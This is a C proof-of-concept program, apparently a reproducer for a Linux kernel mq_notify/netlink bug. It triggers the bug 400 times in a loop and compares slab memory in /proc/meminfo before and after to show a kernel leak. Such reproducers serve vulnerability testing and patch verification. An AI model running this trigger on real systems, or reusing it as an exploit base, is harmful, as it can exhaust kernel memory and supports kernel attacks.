#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <mqueue.h>
#include <time.h>

#define NLFD_SYSCALL 0
#define NLFD_SKB 1

static int make_netlink(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
	if (fd < 0)
		return -1;
	struct sockaddr_nl sa;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = getpid();
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}

static long one_cycle(int i)
{
	char name[64];
	snprintf(name, sizeof(name), "/leaktest_%d_%d", getpid(), i);
	struct mq_attr attr = {
		.mq_maxmsg = 1,
		.mq_msgsize = 16,
	};
	mqd_t mq = mq_open(name, O_RDWR | O_CREAT | O_EXCL, 0600, &attr);
	if (mq < 0) {
		printf("CYCLE mq_open err=%d\n", errno);
		return -1;
	}

	int nlfd = make_netlink();
	if (nlfd < 0) {
		printf("CYCLE netlink err=%d\n", errno);
		mq_close(mq);
		mq_unlink(name);
		return -1;
	}

	int sockbuf = 1;
	setsockopt(nlfd, SOL_SOCKET, SO_RCVBUF, &sockbuf, sizeof(sockbuf));

	struct sigevent sev;
	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_THREAD;
	sev.sigev_signo = nlfd;
	sev.sigev_value.sival_ptr = (void *)&one_cycle;
	if (mq_notify(mq, &sev) < 0)
		printf("CYCLE notify err=%d\n", errno);

	pid_t pid = fork();
	if (pid == 0) {
		struct timespec ts = { .tv_nsec = 20000000 };
		nanosleep(&ts, NULL);
		close(nlfd);
		mq_close(mq);
		mq_unlink(name);
		_exit(0);
	}
	close(nlfd);
	mq_close(mq);
	mq_unlink(name);
	int st;
	waitpid(pid, &st, 0);
	return 0;
}

int main(void)
{
	printf("LEAK start uid=%d\n", getuid());

	char buf0[4096];
	char slab0[64] = "?";
	int fd0 = open("/proc/meminfo", O_RDONLY);
	if (fd0 >= 0) {
		int n = read(fd0, buf0, sizeof(buf0) - 1);
		close(fd0);
		if (n > 0) {
			buf0[n] = 0;
			char *p = strstr(buf0, "Slab:");
			if (p) {
				int j = 0;
				while (p[j] && p[j] != '\n' && j < 60) { slab0[j] = p[j]; j++; }
				slab0[j] = 0;
			}
		}
	}
	printf("LEAK baseline %s\n", slab0);

	for (int i = 0; i < 400; i++)
		if (one_cycle(i) < 0)
			break;
	printf("LEAK cycles=400\n");

	sleep(3);

	int fd = open("/proc/meminfo", O_RDONLY);
	if (fd >= 0) {
		char buf[4096];
		int n = read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (n > 0) {
			buf[n] = 0;
			char *p = strstr(buf, "Slab:");
			if (p) {
				char line[128];
				int j = 0;
				while (p[j] && p[j] != '\n' && j < 120) { line[j] = p[j]; j++; }
				line[j] = 0;
				printf("LEAK after %s\n", line);
			}
		}
	}

	printf("POC_OK\n");
	return 0;
}